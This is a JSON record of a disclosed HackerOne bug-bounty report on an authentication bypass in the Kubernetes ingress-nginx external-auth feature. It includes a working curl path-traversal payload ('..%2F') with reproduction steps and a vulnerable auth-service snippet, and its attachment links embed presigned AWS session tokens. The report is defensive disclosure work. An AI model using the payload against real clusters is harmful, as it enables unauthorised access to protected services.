@@ -1,0 +1,150 @@
+{
+  "id": 1357948,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMzU3OTQ4",
+  "url": "https://hackerone.com/reports/1357948",
+  "title": "Attacker can bypass authentication build on ingress external auth (`nginx.ingress.kubernetes.io/auth-url`)",
+  "state": "Closed",
+  "substate": "informative",
+  "severity_rating": "medium",
+  "readable_substate": "Informative",
+  "created_at": "2021-10-03T19:44:41.492Z",
+  "submitted_at": "2021-10-03T19:44:41.551Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "thisbug",
+    "url": "/thisbug",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/iuetpgLdq7RdaaV7h44ZhjY3/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 39386,
+    "url": "https://hackerone.com/kubernetes",
+    "handle": "kubernetes",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Kubernetes",
+      "twitter_handle": "kubernetesio",
+      "website": "https://kubernetes.io/",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2022-04-23T07:07:08.925Z",
+  "bug_reporter_agreed_on_going_public_at": "2022-04-23T07:07:08.756Z",
+  "team_member_agreed_on_going_public_at": "2022-04-22T16:59:11.914Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Report Submission Form\n\n## Summary:\nSending request with `<public-service>..%2F<protected-service>` allows to manipulate headers:\n\n* X-Original-Url\n* X-Auth-Request-Redirect\n\ndue to that manipulation external auth service could make wrong decision and return 204 instead of 401/403. **To be clear: manipulation of those headers give no possibility to kubernetes user to make any proper decisions based on those headers. ** This way allowing anonymous access to public service and trying to protect access to protected-service by e.g. api-key is not possible.\n\n{F1469913}\n\nExample:\nWith this call `curl -v http://app.test/public-service/..%2Fprotected-service/protected` external auth configured on ingress using `nginx.ingress.kubernetes.io/auth-url: http://auth-service.default.svc.cluster.local:8080/verify` will get following headers:\n```\nX-Request-Id: 7d979c82ca55141ed0d58655fbaac586\nHost: auth-service.default.svc.cluster.local\nX-Original-Url: http://app.test/public-service/..%2Fprotected-service/protected\nX-Original-Method: GET\nX-Sent-From: nginx-ingress-controller\nX-Real-Ip: 192.168.99.1\nX-Forwarded-For: 192.168.99.1\nX-Auth-Request-Redirect: /public-service/..%2Fprotected-service/protected\nConnection: close\nUser-Agent: curl/7.75.0\nAccept: */*\n```\nBoth headers `X-Original-Url` and `X-Auth-Request-Redirect` are manipulated. \n\nHow this auth-service can parse request? Here is simple example of python and Flask:\n```\napi_key = request.headers.get('X-Api-Key')\nrequest_redirect = request.headers.get('X-Auth-Request-Redirect')\n\nif request_redirect and request_redirect.startswith(\"/public-service/\"):\n    return Response(status = HTTPStatus.NO_CONTENT)\n\nif api_key == \"secret-api-key\":  \n    return Response(status = HTTPStatus.NO_CONTENT)\n\nreturn Response(status = HTTPStatus.UNAUTHORIZED)\n```\n\n## Kubernetes Version:\nminikube v1.23.2 on Microsoft Windows 10 Pro 10.0.19043 Build 19043\nKubernetesa v1.22.2 on Docker 20.10.8\n\n## Component Version:\nk8s.gcr.io/ingress-nginx/controller:v1.0.0-beta.3@sha256:44a7a06b71187a4529b0a9edee5cc22bdf71b414470eff696c3869ea8d90a695\n\n## Steps To Reproduce:\n\n  1. Download project in attachment: F1469916\n  2. Install minikube\n  3. Enable addon ingress and ingress-dns\n  4. Build docker images:\n\n    * `cd auth-service; docker build -t auth-service:0.0.4 .`\n    * `cd protected-service; docker build -t protected-service:0.0.1 .`\n    * `cd public-service; docker build -t public-service:0.0.1 .`\n\n  5. push docker images into minikube:\n\n    * `minikube image load auth-service:0.0.4`\n    * `minikube image load protected-service:0.0.1`\n    * `minikube image load public-service:0.0.1`\n\n  6. apply kubernetes configuration: `kubectl apply -f app.yaml`\n\nTo access public service: `curl -v http://app.test/public-service/public`\nTo access protected service: `curl -v http://app.test/protected-service/protected -H \"X-Api-Key: secret-api-key\"`\nTo access protected service bypassing authentication: `curl -v http://app.test/public-service/..%2Fprotected-service/protected`\n\n## Supporting Material/References:\n\n  * in F1469916 - project consist of 2 services: public and protected. Access to public should be available for anyone and to protected only with `X-Api-Key` header. auth-service is protecting access and configured as external auth on ingress.\n    * app.yaml - whole configuration\n    * auth-service, protected-service, public-service - directories with Dockerfiles to build\n\n## Additional note\nAt first I have found this vulnerability in old version of ingress-nginx. It was 0.70.0. With this old version bypass was working without encoding of / to %2F.\ne.g. `curl -v http://app.test/public-service/../protected-service/protected`\nI was not able to reproduce it locally with minikube (couldn't install old ingress addon), but there is possibility that for some older versions of ingress-nginx you don't need to encode / to %2F.\n\n## Impact\n\nAttacker can bypass authentication build on ingress external auth (`nginx.ingress.kubernetes.io/auth-url`). \n\nAttacker can manipulate `X-Original-Url` and `X-Auth-Request-Redirect` headers. Due to this kubernetes user is not able to make safe assumption on those headers.",
+  "weakness": {
+    "id": 27,
+    "name": "Improper Authentication - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1469913,
+      "file_name": "h1-1.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/7k2im7rwxmyd0idnqrg1dd0a36q1?response-content-disposition=attachment%3B%20filename%3D%22h1-1.png%22%3B%20filename%2A%3DUTF-8%27%27h1-1.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWBCQ3S3C%2F20260220%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260220T221356Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCATTN4ch7JbVrRVuzGIrYLKDviSmzX9uMMBWWEu0dr8gIhAIaDKBXLElSPfbwI3cgfxEQDiye6DpqyiIKFxqAvigD%2BKroFCJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgyP%2FFkOL146kCWOhLEqjgXJmtFJQqQy079sIhfhv9KpAlOpDKYTW4IAjuXZsYYrMksEbWbbVP7FIVJ0cZ76CWuf7tWyCOUuLJynGDeiFbe4IWdNPoWUC20FXGD%2BAl2%2FkiqCmu8QdEfMWGGVRGuguYRpRWyn8FeWzrxnO3yeEzn5%2BFT2ffLNxRnpZpDLmwJQBBsDg%2FzisBf1TSsbGr68xBUP2D3%2FYwSvx5pu7fkDLR8buycknP%2FD0aCYmZHlKzdLGyoyzRSbT0KgqwnL%2F5eb%2B3SGDNKcf1FFZb2dp6z9t1tZx%2BcM2vD9fS4F9e8tebUvMZljbAwqn4GLRG45oSJYMyYuhSiF%2BfThMomwiKtn8Q2qViS1RIi3SnCZUAAr5wZo4HW0XhrvgxXzqVPaczhGBEl2NcKQJSsdyomuvOyQNPRAyKrODDT%2B7e0PorMEsWqq667rX%2FqJ5L4h920NI31X3kosPWnwuhQCrMimKuXZLr0EeleZqNYILrtXRWgAYiQM%2Fk5fJDqflN5JHrUynO7qYiDRx047xfUPL3Cwb%2BFGo4fMiWSde84j35txqQV%2Fs5ZXNhLw0hO06mWcHCCmWMIgQugfIDmIh7bPlGpyPnF2kbbhr8LQjoWNvvQ3M%2BH9DPNotrpp5lgcBMBvTBGS%2BmvYUmMmsUOjD1cUpNaovYVgw%2BD7nX7CYBKDtoQE%2B%2BxO3SHG0PbdolVUPMyExV6eQKagew4aXmnhD3y8swafHZmWqqcmMgAcKGVMWtVeYoJLj4V0ukrJEAwO1ZMXovK8UfVYe%2B4VOerSeuNfLzvNCNcOtKrmGFaKiEY%2FllhBLcEqI4Angi%2Fw1FcKTomv7QGqfSDtl1HdIj3wAVPG%2BDP0yf2z3SSZ8qX%2BsZUyEBKo2zeGv34w0MLizAY6sAEG8XrKd%2BZgT93RT3cLKagJFrTy4SSkSfTsG9urJpg%2Bn5xmViomx0ru43X8G9xOYbc%2BCkYn2XOZAQuhBCKeSYUEnJclPH4rrTsh5nDbicN%2BipRy3MOyXJRVWYn0ta6HG30rvKknd7IVtuu%2FjO5yeiCd2yg6MW7eTge8XTe%2BVnv8pbffh0L%2BiadipxYA8RAOdWDz4sygM3YcYhXNsoGcRwxJ8IB%2F6boaGmY6OWXXxA%2FkZw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=7901546dae2ad79407fd7c8678f332ba0e10f7471ea37faa27c5f3ca6f6a1b1f",
+      "file_size": 27259,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 1469916,
+      "file_name": "k8s-ingress-auth-bypass.zip",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/2ippwb4ryh6c7u8ubfau3o9tbolk?response-content-disposition=attachment%3B%20filename%3D%22k8s-ingress-auth-bypass.zip%22%3B%20filename%2A%3DUTF-8%27%27k8s-ingress-auth-bypass.zip&response-content-type=application%2Fzip&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWBCQ3S3C%2F20260220%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260220T221356Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCATTN4ch7JbVrRVuzGIrYLKDviSmzX9uMMBWWEu0dr8gIhAIaDKBXLElSPfbwI3cgfxEQDiye6DpqyiIKFxqAvigD%2BKroFCJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgyP%2FFkOL146kCWOhLEqjgXJmtFJQqQy079sIhfhv9KpAlOpDKYTW4IAjuXZsYYrMksEbWbbVP7FIVJ0cZ76CWuf7tWyCOUuLJynGDeiFbe4IWdNPoWUC20FXGD%2BAl2%2FkiqCmu8QdEfMWGGVRGuguYRpRWyn8FeWzrxnO3yeEzn5%2BFT2ffLNxRnpZpDLmwJQBBsDg%2FzisBf1TSsbGr68xBUP2D3%2FYwSvx5pu7fkDLR8buycknP%2FD0aCYmZHlKzdLGyoyzRSbT0KgqwnL%2F5eb%2B3SGDNKcf1FFZb2dp6z9t1tZx%2BcM2vD9fS4F9e8tebUvMZljbAwqn4GLRG45oSJYMyYuhSiF%2BfThMomwiKtn8Q2qViS1RIi3SnCZUAAr5wZo4HW0XhrvgxXzqVPaczhGBEl2NcKQJSsdyomuvOyQNPRAyKrODDT%2B7e0PorMEsWqq667rX%2FqJ5L4h920NI31X3kosPWnwuhQCrMimKuXZLr0EeleZqNYILrtXRWgAYiQM%2Fk5fJDqflN5JHrUynO7qYiDRx047xfUPL3Cwb%2BFGo4fMiWSde84j35txqQV%2Fs5ZXNhLw0hO06mWcHCCmWMIgQugfIDmIh7bPlGpyPnF2kbbhr8LQjoWNvvQ3M%2BH9DPNotrpp5lgcBMBvTBGS%2BmvYUmMmsUOjD1cUpNaovYVgw%2BD7nX7CYBKDtoQE%2B%2BxO3SHG0PbdolVUPMyExV6eQKagew4aXmnhD3y8swafHZmWqqcmMgAcKGVMWtVeYoJLj4V0ukrJEAwO1ZMXovK8UfVYe%2B4VOerSeuNfLzvNCNcOtKrmGFaKiEY%2FllhBLcEqI4Angi%2Fw1FcKTomv7QGqfSDtl1HdIj3wAVPG%2BDP0yf2z3SSZ8qX%2BsZUyEBKo2zeGv34w0MLizAY6sAEG8XrKd%2BZgT93RT3cLKagJFrTy4SSkSfTsG9urJpg%2Bn5xmViomx0ru43X8G9xOYbc%2BCkYn2XOZAQuhBCKeSYUEnJclPH4rrTsh5nDbicN%2BipRy3MOyXJRVWYn0ta6HG30rvKknd7IVtuu%2FjO5yeiCd2yg6MW7eTge8XTe%2BVnv8pbffh0L%2BiadipxYA8RAOdWDz4sygM3YcYhXNsoGcRwxJ8IB%2F6boaGmY6OWXXxA%2FkZw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=fc539bea9bd6ec03b5300872c8ca1a1c0203ff79e821ac8a57e58760df85fd11",
+      "file_size": 5876,
+      "type": "application/zip",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 15,
+  "voters": [
+    "rondons",
+    "k0ns0l",
+    "p4n7h3rx",
+    "alp",
+    "zy9ard3",
+    "thruster",
+    "h4x0r_dz",
+    "pr0f0x01",
+    "shivammusic",
+    "iqrah0x01",
+    "and 5 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 6.5,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "low",
+      "integrity": "low",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 32524,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/kubernetes/ingress-nginx",
+    "max_severity": "none"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
